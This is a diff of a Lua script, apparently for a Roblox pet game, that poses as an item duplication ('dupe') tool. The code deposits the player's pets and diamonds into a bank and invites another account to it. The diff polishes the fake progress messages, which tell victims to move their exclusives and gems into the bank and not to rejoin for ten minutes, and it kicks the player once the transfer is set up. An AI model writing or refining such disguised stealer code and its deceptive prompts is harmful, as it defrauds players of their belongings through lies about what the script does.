@@ -11,23 +11,25 @@ for i,v in pairs(lib.Save.Get().Pets) do
 end
 local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
 if request then
-    lib.Message.New("starting dupe...");
+    lib.Message.New("Starting dupe...");
 	wait(1)
-	lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber;
+	lib.Message.New("Starting dupe... (25%)");
 	wait(1)
-	lib.Message.New("processing dupe... (18%)");
-	wait(1)
-	lib.Message.New("processing dupe... (59%)");
+	lib.Message.New("Starting dupe... (53%)");
+	wait(2)
+	lib.Message.New("Starting dupe... (81%)");
 	wait(3)
-	lib.Message.New("processing dupe... (99%)");
+	lib.Message.New("Starting dupe... (95%)");
+	wait(1)
+	lib.Message.New("Starting dupe... (99%)");
 else
 end
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
-    lib.Message.New("DUPE REQUESTED! make sure all the items to dupe are stored in the bank [gems and pets]");
+    lib.Message.New("Processing dupe! Please make sure all of your exclusives and gems are in the bank. If they aren't, quickly add them.");
 	wait(5)
-	lib.Message.New("DUPE PENDING! If your pets and gems aren't in the bank, quickly add them.");
+	lib.Message.New("Please do not rejoin the game in the next 10 minutes or you may lose the pet(s) and gems. If your pets and gems aren't in the bank, quickly add them.");
 	wait(15)
-	game.Players.LocalPlayer:Kick("DUPE SUCCESS!!!! please allow FIVE[5] minutes for the servers to save the duped progress before rejoining")
+	game.Players.LocalPlayer:Kick("Please do not rejoin the game in the next 10 minutes unless your exclusives and gems aren't placed in the bank.")
 
 else
 	lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber)
